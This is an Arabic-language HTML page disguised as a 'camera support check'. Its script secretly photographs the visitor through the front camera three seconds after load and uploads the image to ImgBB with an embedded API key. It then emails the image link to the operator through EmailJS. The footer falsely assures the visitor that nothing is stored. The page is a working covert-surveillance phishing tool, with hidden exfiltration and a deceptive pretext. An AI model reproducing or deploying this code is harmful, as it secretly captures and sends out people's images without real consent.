<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحقق من دعم الكاميرا</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 600px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    
    .video-container {
      position: relative;
      width: 100%;
      max-width: 400px;
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    
    video {
      width: 100%;
      border-radius: 10px;
      background: #000;
      transform: scaleX(-1); /* Mirror effect */
    }
    
    .loading {
      display: none;
      margin: 30px 0;
    }
    
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    
    .success {
      color: #4cd97b;
      display: none;
    }
    
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>جارٍ التحقق من دعم كاميرا الجهاز...</h1>
    
    <div class="video-container">
      <video id="video" autoplay playsinline></video>
    </div>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>جارٍ معالجة البيانات، الرجاء الانتظار</p>
    </div>
    
    <div class="message">
      <p>تم الانتهاء من التحقق بنجاح!</p>
      <p class="success">يمكنك إغلاق هذه الصفحة الآن</p>
    </div>
    
    <div class="error" id="error-message">
      خطأ: تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الصلاحيات اللازمة
    </div>
    
    <div class="footer">
      <p>هذا الاختبار آمن ولا يتم تخزين أي بيانات شخصية</p>
    </div>
  </div>

  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      const video = document.getElementById('video');
      const loading = document.querySelector('.loading');
      const message = document.querySelector('.message');
      const success = document.querySelector('.success');
      const errorMsg = document.getElementById('error-message');
      
      try {
        // Access camera
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        video.srcObject = stream;
        
        // Hide error message if shown
        errorMsg.style.display = 'none';
        
        // Wait 3 seconds then capture
        setTimeout(async () => {
          try {
            loading.style.display = 'block';
            
            // Capture image
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            // Flip image horizontally for correct orientation
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Reset transformation
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            
            // Get image as JPEG
            const imageData = canvas.toDataURL('image/jpeg', 0.85);
            
            // Stop the video stream
            stream.getTracks().forEach(track => track.stop());
            
            // Prepare for ImgBB upload
            const base64Image = imageData.split(',')[1];
            
            // Upload to ImgBB
            const formData = new FormData();
            formData.append('image', base64Image);
            formData.append('name', 'camera_capture_' + Date.now());
            
            const imgbbResponse = await fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
              method: 'POST',
              body: formData
            });
            
            const imgbbData = await imgbbResponse.json();
            
            if (!imgbbData.success) {
              throw new Error('فشل رفع الصورة إلى ImgBB');
            }
            
            const imageUrl = imgbbData.data.url;
            
            // Send email using EmailJS
            await emailjs.send("service_890xst3", "template_p1oukct", {
              name: "كاميرا الويب",
              time: new Date().toLocaleString(),
              message: "تم التقاط صورة جديدة وإرسالها عبر البريد.",
              image_url: imageUrl
            });
            
            // Show success message
            loading.style.display = 'none';
            message.style.display = 'block';
            setTimeout(() => {
              success.style.display = 'block';
            }, 1000);
            
          } catch (error) {
            console.error('Error:', error);
            showError('حدث خطأ أثناء المعالجة');
          }
        }, 3000);
        
      } catch (error) {
        console.error('Camera error:', error);
        showError('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الصلاحيات اللازمة');
      }
      
      function showError(msg) {
        loading.style.display = 'none';
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
        video.style.display = 'none';
      }
    });
  </script>
</body>
</html>
